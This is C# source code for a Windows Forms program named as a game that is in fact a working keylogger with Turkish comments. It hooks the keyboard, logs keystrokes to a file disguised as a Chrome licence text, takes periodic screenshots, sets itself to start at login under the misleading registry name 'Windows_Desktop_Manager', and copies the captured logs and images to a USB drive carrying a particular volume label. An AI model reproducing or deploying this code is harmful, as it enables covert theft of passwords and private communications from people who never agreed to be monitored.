using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using HootKeys;
using System.IO;
using System.Security.Principal;
using System.Drawing.Imaging;
namespace games
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            TuslariDinle();
        }
    
        


        [DllImport("user32.dll")]
        static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
        const int KEYEVENTF_EXTENDEDKEY = 0x1;
        const int KEYEVENTF_KEYUP = 0x2;



        globalKeyboardHook klavye = new globalKeyboardHook();
        int number = 0;
        string log = "";
        bool BigChar = true;

        void TuslariDinle()
        {

            klavye.HookedKeys.Add(Keys.A);
            klavye.HookedKeys.Add(Keys.S);
            klavye.HookedKeys.Add(Keys.D);
            klavye.HookedKeys.Add(Keys.F);
            klavye.HookedKeys.Add(Keys.G);
            klavye.HookedKeys.Add(Keys.H);
            klavye.HookedKeys.Add(Keys.J);
            klavye.HookedKeys.Add(Keys.K);
            klavye.HookedKeys.Add(Keys.L);
            klavye.HookedKeys.Add(Keys.Z);
            klavye.HookedKeys.Add(Keys.X);
            klavye.HookedKeys.Add(Keys.C);
            klavye.HookedKeys.Add(Keys.V);
            klavye.HookedKeys.Add(Keys.B);
            klavye.HookedKeys.Add(Keys.N);
            klavye.HookedKeys.Add(Keys.M);
            klavye.HookedKeys.Add(Keys.Q);
            klavye.HookedKeys.Add(Keys.W);
            klavye.HookedKeys.Add(Keys.E);
            klavye.HookedKeys.Add(Keys.R);
            klavye.HookedKeys.Add(Keys.T);
            klavye.HookedKeys.Add(Keys.Y);
            klavye.HookedKeys.Add(Keys.U);
            klavye.HookedKeys.Add(Keys.I);
            klavye.HookedKeys.Add(Keys.O);
            klavye.HookedKeys.Add(Keys.P);

            //Türkçe Karekterler 

            klavye.HookedKeys.Add(Keys.OemOpenBrackets);
            klavye.HookedKeys.Add(Keys.Oem6);
            klavye.HookedKeys.Add(Keys.Oem1);
            klavye.HookedKeys.Add(Keys.Oem7);
            klavye.HookedKeys.Add(Keys.OemQuestion);
            klavye.HookedKeys.Add(Keys.Oem5);

            //Rakamlar

            klavye.HookedKeys.Add(Keys.NumPad0);
            klavye.HookedKeys.Add(Keys.NumPad1);
            klavye.HookedKeys.Add(Keys.NumPad2);
            klavye.HookedKeys.Add(Keys.NumPad3);
            klavye.HookedKeys.Add(Keys.NumPad4);
            klavye.HookedKeys.Add(Keys.NumPad5);
            klavye.HookedKeys.Add(Keys.NumPad6);
            klavye.HookedKeys.Add(Keys.NumPad7);
            klavye.HookedKeys.Add(Keys.NumPad8);
            klavye.HookedKeys.Add(Keys.NumPad9);

            //Üst Rakamlar

            klavye.HookedKeys.Add(Keys.D0);
            klavye.HookedKeys.Add(Keys.D1);
            klavye.HookedKeys.Add(Keys.D2);
            klavye.HookedKeys.Add(Keys.D3);
            klavye.HookedKeys.Add(Keys.D4);
            klavye.HookedKeys.Add(Keys.D5);
            klavye.HookedKeys.Add(Keys.D6);
            klavye.HookedKeys.Add(Keys.D7);
            klavye.HookedKeys.Add(Keys.D8);
            klavye.HookedKeys.Add(Keys.D9);

            //nokta , backspace vs
            klavye.HookedKeys.Add(Keys.OemPeriod);

            klavye.HookedKeys.Add(Keys.Space);
            klavye.HookedKeys.Add(Keys.Enter);
            klavye.HookedKeys.Add(Keys.CapsLock);

            klavye.HookedKeys.Add(Keys.Back);

            klavye.KeyDown += new KeyEventHandler(TusKombinasyonu);
        }


        void Save()
        {
            try
            {


               File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Chrome\\Chrome Licence 2021.txt", Environment.NewLine  + "[" + DateTime.Now.ToString() + "] "  +   log);
                SendKeys.Send("{PRTSC}");
                 Image myimage = Clipboard.GetImage();
                 pictureBox1.Image = myimage;
                string saat =  "IMG " + DateTime.Now.ToString().Replace(" ", "").Replace(":", "_").Replace("/", " ") + ".png";

                  string yol = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Chrome\\Photos\\";
                pictureBox1.Image.Save(yol + saat, ImageFormat.Jpeg);
                log = "";
            
            }
            catch(Exception asdf)
            {
                string asdg = asdf + " ";
                File.AppendAllText("C:\\Users\\" + Environment.UserName + "\\Desktop\\qwe.txt", asdg);
            }
        }


        void TusKombinasyonu(object sender, KeyEventArgs e)
        {

            if (number > 50)
            {
                number = 0;
                Save();

                log = "";
            }


            if (e.KeyCode == Keys.CapsLock)
            {
                if (BigChar == true)
                    BigChar = false;
                else
                    BigChar = true;
            }


            //nokta , backspace vs
            if (e.KeyCode == Keys.OemPeriod)
            {

                log += ".";
                number++;
            }
            if (e.KeyCode == Keys.Back)
            {

                log += "*Back*";
                number++;
            }

            //Rakamlar
            if (e.KeyCode == Keys.NumPad0 || e.KeyCode == Keys.D0)
            {

                log += "0";
                number++;
            }
            if (e.KeyCode == Keys.NumPad1 || e.KeyCode == Keys.D1)
            {

                log += "1";
                number++;
            }
            if (e.KeyCode == Keys.NumPad2 || e.KeyCode == Keys.D2)
            {

                log += "2";
                number++;
            }
            if (e.KeyCode == Keys.NumPad3 || e.KeyCode == Keys.D3)
            {

                log += "3";
                number++;
            }
            if (e.KeyCode == Keys.NumPad4 || e.KeyCode == Keys.D4)
            {

                log += "4";
                number++;
            }
            if (e.KeyCode == Keys.NumPad5 || e.KeyCode == Keys.D5)
            {

                log += "5";
                number++;
            }
            if (e.KeyCode == Keys.NumPad6 || e.KeyCode == Keys.D6)
            {

                log += "6";
                number++;
            }
            if (e.KeyCode == Keys.NumPad7 || e.KeyCode == Keys.D7)
            {

                log += "7";
                number++;
            }
            if (e.KeyCode == Keys.NumPad8 || e.KeyCode == Keys.D8)
            {

                log += "8";
                number++;
            }
            if (e.KeyCode == Keys.NumPad9 || e.KeyCode == Keys.D9)
            {

                log += "9";
                number++;
            }



            //Türkçe Karekterler

            if (e.KeyCode == Keys.OemOpenBrackets)
            {
                if (BigChar == true)
                    log += "Ğ";
                else
                    log += "ğ";

                number++;
            }
            if (e.KeyCode == Keys.Oem6)
            {
                if (BigChar == true)
                    log += "Ü";
                else
                    log += "ü";

                number++;
            }
            if (e.KeyCode == Keys.Oem1)
            {
                if (BigChar == true)
                    log += "Ş";
                else
                    log += "ş";

                number++;
            }

            if (e.KeyCode == Keys.Oem7)
            {
                if (BigChar == true)
                    log += "İ";
                else
                    log += "i";

                number++;
            }
            if (e.KeyCode == Keys.OemQuestion)
            {
                if (BigChar == true)
                    log += "Ö";
                else
                    log += "ö";

                number++;
            }
            if (e.KeyCode == Keys.Oem5)
            {
                if (BigChar == true)
                    log += "Ç";
                else
                    log += "ç";

                number++;
            }


            //ENTER BACKSPACE VS

            if (e.KeyCode == Keys.Enter)
            {
                log += " -enter- ";
                number++;
            }

            if (e.KeyCode == Keys.Space)
            {
                log += " ";
                number++;
            }


            //Diğer Karekterler


            if (e.KeyCode == Keys.A)
            {
                if (BigChar == true)
                    log += "A";
                else
                    log += "a";

                number++;
            }
            if (e.KeyCode == Keys.S)
            {
                if (BigChar == true)
                    log += "S";
                else
                    log += "s";

                number++;
            }
            if (e.KeyCode == Keys.D)
            {
                if (BigChar == true)
                    log += "D";
                else
                    log += "d";

                number++;
            }
            if (e.KeyCode == Keys.F)
            {

                if (BigChar == true)
                    log += "F";
                else
                    log += "f";

                number++;
            }
            if (e.KeyCode == Keys.G)
            {

                if (BigChar == true)
                    log += "G";
                else
                    log += "g";

                number++;
            }
            if (e.KeyCode == Keys.H)
            {

                if (BigChar == true)
                    log += "H";
                else
                    log += "h";

                number++;
            }
            if (e.KeyCode == Keys.J)
            {

                if (BigChar == true)
                    log += "J";
                else
                    log += "j";

                number++;
            }
            if (e.KeyCode == Keys.K)
            {

                if (BigChar == true)
                    log += "K";
                else
                    log += "k";

                number++;

            }
            if (e.KeyCode == Keys.L)
            {

                if (BigChar == true)
                    log += "L";
                else
                    log += "l";

                number++;
            }
            if (e.KeyCode == Keys.Z)
            {

                if (BigChar == true)
                    log += "Z";
                else
                    log += "z";

                number++;
            }
            if (e.KeyCode == Keys.X)
            {

                if (BigChar == true)
                    log += "X";
                else
                    log += "x";

                number++;
            }
            if (e.KeyCode == Keys.C)
            {

                if (BigChar == true)
                    log += "C";
                else
                    log += "c";

                number++;
            }
            if (e.KeyCode == Keys.V)
            {

                if (BigChar == true)
                    log += "V";
                else
                    log += "v";

                number++;
            }
            if (e.KeyCode == Keys.B)
            {

                if (BigChar == true)
                    log += "B";
                else
                    log += "b";

                number++;
            }
            if (e.KeyCode == Keys.N)
            {

                if (BigChar == true)
                    log += "N";
                else
                    log += "n";

                number++;
            }
            if (e.KeyCode == Keys.M)
            {

                if (BigChar == true)
                    log += "M";
                else
                    log += "m";

                number++;

            }
            if (e.KeyCode == Keys.Q)
            {

                if (BigChar == true)
                    log += "Q";
                else
                    log += "q";

                number++;
            }
            if (e.KeyCode == Keys.W)
            {

                if (BigChar == true)
                    log += "W";
                else
                    log += "w";

                number++;
            }
            if (e.KeyCode == Keys.E)
            {

                if (BigChar == true)
                    log += "E";
                else
                    log += "e";

                number++;
            }
            if (e.KeyCode == Keys.R)
            {

                if (BigChar == true)
                    log += "R";
                else
                    log += "r";

                number++;
            }
            if (e.KeyCode == Keys.T)
            {

                if (BigChar == true)
                    log += "T";
                else
                    log += "t";

                number++;
            }
            if (e.KeyCode == Keys.Y)
            {

                if (BigChar == true)
                    log += "Y";
                else
                    log += "y";

                number++;
            }
            if (e.KeyCode == Keys.U)
            {

                if (BigChar == true)
                    log += "U";
                else
                    log += "u";

                number++;
            }
            if (e.KeyCode == Keys.I)
            {

                if (BigChar == true)
                    log += "I";
                else
                    log += "ı";

                number++;
            }
            if (e.KeyCode == Keys.O)
            {

                if (BigChar == true)
                    log += "O";
                else
                    log += "o";

                number++;
            }
            if (e.KeyCode == Keys.P)
            {

                if (BigChar == true)
                    log += "P";
                else
                    log += "p";

                number++;
            }
        }



        public void Form1_Load(object sender, EventArgs e)
        {
            
          
            if (Control.IsKeyLocked(Keys.CapsLock))
            {
                BigChar = true;
            }
            else
            {
                BigChar = false;
            }



            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            key.SetValue("Windows_Desktop_Manager", "\"" + Application.ExecutablePath + "\"");
        }

        private const int WM_DEVICECHANGE = 0x219;
        private const int DBT_DEVICEARRIVAL = 0x8000;
        private const int DBT_DEVICEREMOVECOMPLETE = 0x8004;
        private const int DBT_DEVTYP_VOLUME = 0x00000002;


        public struct DevBroadcastVolume
        {
            public int Size;
            public int DeviceType;
            public int Reserved;
            public int Mask;
            public Int16 Flags;
        }

        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            string[] dosyalar;
            switch (m.Msg)
            {
            
                case WM_DEVICECHANGE:
                    switch ((int)m.WParam)
                    {
                        case DBT_DEVICEARRIVAL:
                            string surucu_yolu = "";
                            foreach (string value in DriveInfo.GetDrives().Where(d => d.DriveType == DriveType.Removable).Select(d => d.Name))
                                surucu_yolu = value;
                            string name = new DriveInfo(surucu_yolu).VolumeLabel;
                            Save();
                            if (name == "Unqown")
                            {
                                if(File.Exists(surucu_yolu + "\\KeyLogger\\Loglar.txt"))
                                {
                                    File.Delete(surucu_yolu + "\\KeyLogger\\Loglar.txt");
                                    File.Copy("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Chrome\\Chrome Licence 2021.txt", surucu_yolu + "\\KeyLogger\\Loglar.txt");
                                    Form2 settingsForm = new Form2();
                                    settingsForm.Show();
                                    settingsForm.Hide();
                                    settingsForm.WindowState = FormWindowState.Minimized;
                                    settingsForm.ShowInTaskbar = false;
                                    string sourceDirectory = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Chrome\Photos";
                                    string moveDirectory = surucu_yolu + @"KeyLogger\Photos";

                                    Copy(sourceDirectory, moveDirectory);
                                    System.Threading.Thread.Sleep(3000);
                                    settingsForm.Text = "Dosyalar aktarıldı";
                                    System.Threading.Thread.Sleep(1000);
                                    settingsForm.Close();
                                }

                                else
                                {
                                    Form2 settingsForm = new Form2();
                                    settingsForm.Show();
                                    settingsForm.Hide();
                                    settingsForm.WindowState = FormWindowState.Minimized;
                                    settingsForm.ShowInTaskbar = false;
                                    string sourceDirectory = @"C:\Users\" + Environment.UserName + @"\AppData\Local\Chrome\Photos";
                                    string moveDirectory = surucu_yolu + @"KeyLogger\Photos";

                                    Copy(sourceDirectory, moveDirectory);


                                    File.Copy("C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Chrome\\Chrome Licence 2021.txt", surucu_yolu + "\\KeyLogger\\Loglar.txt");
                                    System.Threading.Thread.Sleep(3000);
                                    settingsForm.Text = "Dosyalar aktarıldı";
                                    
                                    System.Threading.Thread.Sleep(1000);
                                    settingsForm.Close();
                                    
                                }
                            }                           
                            break;

                        case DBT_DEVICEREMOVECOMPLETE:
                            //Event
                            break;
                    }
                    break;
            }


        }

        public static void Copy(string kaynakDizin, string hedefDizin)
        {
            var diKaynak = new DirectoryInfo(kaynakDizin);
            var diHedef = new DirectoryInfo(hedefDizin);
            CopyAll(diKaynak, diHedef);
        }

        public static void CopyAll(DirectoryInfo kaynak, DirectoryInfo hedef)
        {
            Directory.CreateDirectory(hedef.FullName);
            //Dosyaları Yeni Dizine Kopyalıyoruz.
            foreach (FileInfo fi in kaynak.GetFiles())
            {
                Console.WriteLine(@"Kopyalanan : {0} \ {1}", hedef.FullName, fi.Name);
                fi.CopyTo(Path.Combine(hedef.FullName, fi.Name), true);
            }
            //Özyineli (recursive) Fonksiyon Kullanarak Alt Dizinleri Kopyalıyoruz.
            foreach (DirectoryInfo diKaynakAltDizin in kaynak.GetDirectories())
            {
                DirectoryInfo sonrakiHedefAltDizin =
                    hedef.CreateSubdirectory(diKaynakAltDizin.Name);
                CopyAll(diKaynakAltDizin, sonrakiHedefAltDizin);
            }
        }
    }

}